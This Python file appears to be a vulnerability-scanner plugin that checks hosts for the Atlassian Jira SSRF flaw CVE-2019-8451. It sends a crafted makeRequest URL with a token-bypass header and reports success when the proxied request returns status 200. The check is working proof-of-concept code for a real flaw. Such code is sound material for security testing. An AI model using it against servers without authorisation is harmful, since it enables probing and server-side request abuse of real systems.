from utils.status import *
from .helper import Plugin,utils

class CVE_2019_8451(Plugin):
    def __init__(self):
        self.name        = "Atlassian SSRF - CVE_2019_8451"
        self.enable      = True
        self.description = ""

    def presquites(self, host):
        return bool(utils.isalive( utils.uri(host) ))

    def main(self,host):

        poc = f"{utils.uri(host)}plugins/servlet/gadgets/makeRequest?url=http://www.atlassian.com:8080@www.google.com&httpMethod=GET&contentType=JSON&gadget=http%3A%2F%2Fbitthebyte.local%3A8090%2Frest%2Fgadgets%2F1.0%2Fg%2Fcom.atlassian.streams.streams-jira-plugin%3Aactivitystream-gadget%2Fgadgets%2Factivitystream-gadget.xml&container=atlassian"
        request = utils.requests.get(poc, headers={'X-Atlassian-Token':'no-check'})

        if '"rc":200' in request.text:

            return Result(
                status   = SUCCESS,
                msg      = poc,
                request  = utils.dump_request(request),
                response = utils.dump_response(request)
            )

        return Result(FAILED,None,utils.dump_request(request),utils.dump_response(request))